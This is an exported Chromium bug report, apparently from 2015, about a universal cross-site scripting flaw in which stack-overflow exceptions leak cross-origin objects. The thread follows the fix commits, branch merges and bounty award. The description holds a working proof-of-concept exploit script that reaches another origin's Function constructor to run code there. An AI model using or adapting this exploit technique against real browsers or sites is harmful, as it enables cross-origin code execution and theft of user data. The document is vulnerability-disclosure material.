# Security: Universal XSS using stack overflow exceptions

| Field | Value |
|-------|-------|
| **Issue ID** | [40082841](https://issues.chromium.org/issues/40082841) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Bindings |
| **Reporter** | ma...@gmail.com |
| **Assignee** | jo...@chromium.org |
| **Created** | 2015-09-10 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

When the maximum call stack size is exceeded, a RangeError object is created using isolate's current context. Thus, if a cross-origin context had been entered (through the V8WrapperInstantiationScope constructor, for example), a cross-origin exception will be propagated to the catch handler.

**VERSION**  

Chrome 45.0.2454.85 (Stable)  

Chrome 46.0.2490.22 (Beta)  

Chrome 47.0.2503.0 (Dev)  

Chromium 47.0.2507.0 (Release build compiled today)

**REPRODUCTION CASE**

<script>
var i = document.documentElement.appendChild(document.createElement('iframe'));
function g() {
var w = frames[0];
function f() {
try { f(); } catch(e) {}
try { w.location; } catch(e) { o = e; }
}
f();
o.constructor.constructor('alert(location)')();
}
function c() {
try { frames[0].a; } catch(e) {
clearInterval(s);
g();
}
}
var s = setInterval(c, 1);
i.src = 'https://abc.xyz';
</script>

## Attachments

- [exploit.html](attachments/exploit.html) (text/html, 452 B)

## Timeline

### ri...@chromium.org (2015-09-10)

Nice find!

### cl...@chromium.org (2015-09-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-09-14)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=202211

------------------------------------------------------------------
r202211 | jochen@chromium.org | 2015-09-14T18:02:36.681074Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow-expected.txt?r1=202211&r2=202210&pathrev=202211
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow.html?r1=202211&r2=202210&pathrev=202211
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/core/v8/V8DOMWrapper.cpp?r1=202211&r2=202210&pathrev=202211
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/core/v8/V8DOMWrapper.h?r1=202211&r2=202210&pathrev=202211

Rethrow cross-site exceptions as security errors

BUG=530301
R=epertoso@chromium.org,haraken@chromium.org

Review URL: https://codereview.chromium.org/1339023002
-----------------------------------------------------------------

### jo...@chromium.org (2015-09-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-09-14)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### jo...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### ha...@chromium.org (2015-09-15)

I would propose merging this to 45 too.

### am...@google.com (2015-09-15)

Merge approved for M45 branch 2454 and M46 branch 2490.

### jw...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-09-16)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=202326

------------------------------------------------------------------
r202326 | jochen@chromium.org | 2015-09-16T06:57:47.629881Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2490/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow-expected.txt?r1=202326&r2=202325&pathrev=202326
   A http://src.chromium.org/viewvc/blink/branches/chromium/2490/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow.html?r1=202326&r2=202325&pathrev=202326
   M http://src.chromium.org/viewvc/blink/branches/chromium/2490/Source/bindings/core/v8/V8DOMWrapper.cpp?r1=202326&r2=202325&pathrev=202326
   M http://src.chromium.org/viewvc/blink/branches/chromium/2490/Source/bindings/core/v8/V8DOMWrapper.h?r1=202326&r2=202325&pathrev=202326

Merge 202211 "Rethrow cross-site exceptions as security errors"

> Rethrow cross-site exceptions as security errors
> 
> BUG=530301
> R=epertoso@chromium.org,haraken@chromium.org
> 
> Review URL: https://codereview.chromium.org/1339023002

TBR=jochen@chromium.org

Review URL: https://codereview.chromium.org/1349593002
-----------------------------------------------------------------

### bu...@chromium.org (2015-09-16)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=202330

------------------------------------------------------------------
r202330 | jochen@chromium.org | 2015-09-16T07:04:10.207940Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2454/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow-expected.txt?r1=202330&r2=202329&pathrev=202330
   A http://src.chromium.org/viewvc/blink/branches/chromium/2454/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow.html?r1=202330&r2=202329&pathrev=202330
   M http://src.chromium.org/viewvc/blink/branches/chromium/2454/Source/bindings/core/v8/V8DOMWrapper.cpp?r1=202330&r2=202329&pathrev=202330
   M http://src.chromium.org/viewvc/blink/branches/chromium/2454/Source/bindings/core/v8/V8DOMWrapper.h?r1=202330&r2=202329&pathrev=202330

Merge 202211 "Rethrow cross-site exceptions as security errors"

> Rethrow cross-site exceptions as security errors
> 
> BUG=530301
> R=epertoso@chromium.org,haraken@chromium.org
> 
> Review URL: https://codereview.chromium.org/1339023002

TBR=jochen@chromium.org

Review URL: https://codereview.chromium.org/1350633002
-----------------------------------------------------------------

### ha...@chromium.org (2015-09-18)

[Empty comment from Monorail migration]

### ti...@google.com (2015-09-22)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-09-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b7532e9194d104aa07710ac6764f73b35ca2042a

commit b7532e9194d104aa07710ac6764f73b35ca2042a
Author: jochen@chromium.org <jochen@chromium.org>
Date: Wed Sep 16 06:57:47 2015

Merge 202211 "Rethrow cross-site exceptions as security errors"

> Rethrow cross-site exceptions as security errors
> 
> BUG=530301
> R=epertoso@chromium.org,haraken@chromium.org
> 
> Review URL: https://codereview.chromium.org/1339023002

TBR=jochen@chromium.org

Review URL: https://codereview.chromium.org/1349593002

git-svn-id: svn://svn.chromium.org/blink/branches/chromium/2490@202326 bbb929c8-8fbe-4397-9dbb-9b2b20218538

[add] http://crrev.com/b7532e9194d104aa07710ac6764f73b35ca2042a/third_party/WebKit/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow-expected.txt
[add] http://crrev.com/b7532e9194d104aa07710ac6764f73b35ca2042a/third_party/WebKit/LayoutTests/http/tests/security/xss-DENIED-cross-origin-stack-overflow.html
[modify] http://crrev.com/b7532e9194d104aa07710ac6764f73b35ca2042a/third_party/WebKit/Source/bindings/core/v8/V8DOMWrapper.cpp
[modify] http://crrev.com/b7532e9194d104aa07710ac6764f73b35ca2042a/third_party/WebKit/Source/bindings/core/v8/V8DOMWrapper.h


### bu...@chromium.org (2015-09-24)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/b7532e9194d104aa07710ac6764f73b35ca2042a

commit b7532e9194d104aa07710ac6764f73b35ca2042a
Author: jochen@chromium.org <jochen@chromium.org>
Date: Wed Sep 16 06:57:47 2015


### ti...@google.com (2015-09-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-21)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2016-06-30)

Maruisz - $7,500 for this report. We'll add it to your tab.

### aw...@chromium.org (2016-08-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/530301?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082841)*
